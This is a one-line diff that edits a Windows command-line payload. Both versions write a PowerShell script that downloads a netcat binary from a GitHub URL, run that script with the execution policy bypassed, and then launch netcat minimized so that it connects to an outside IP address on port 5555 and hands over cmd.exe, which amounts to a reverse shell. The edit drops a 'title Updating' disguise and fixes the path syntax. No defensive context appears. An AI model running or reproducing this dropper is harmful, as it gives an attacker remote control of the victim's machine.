@@ -1,1 +1,1 @@
-cmd /c "title Updating & mkdir /s & cd /s & echo (wget 'https://github.com/puffin2/y/raw/master/nc.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe 80.2.9.175 5555 -e cmd.exe -d & exit"
+cmd /c "mkdir \s & cd \s & echo (wget 'https://github.com/puffin2/y/raw/master/nc.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe 80.2.9.175 5555 -e cmd.exe -d & exit"
